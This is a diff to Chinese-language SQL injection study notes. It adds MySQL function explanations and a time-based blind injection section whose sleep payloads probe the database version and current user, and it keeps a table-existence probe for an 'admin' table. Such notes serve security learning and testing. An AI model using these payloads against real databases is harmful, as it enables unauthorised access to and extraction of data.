@@ -8,8 +8,16 @@ database() 数据库名称
 system_user() 系统用户名
 current_user() 当前用户名
 session_user() 连接数据库的用户名
-### 手工注入 
+floor() 取整
+rand() 随机0-1
+concat("abc","123")=abc123
+concat("abc",0x22,"123")=abc"123
 
+### 手工注入 
+#### 延时注入
+select sleep(if(length(@@version)=6,2,0));
+长度为6 sleep 2秒，否则0秒。
+select sleep(if(ord(mid((select user()),1,1))<150,0,2));
 > and exists(select * from admin) 
 >  // 说明存在表明
 
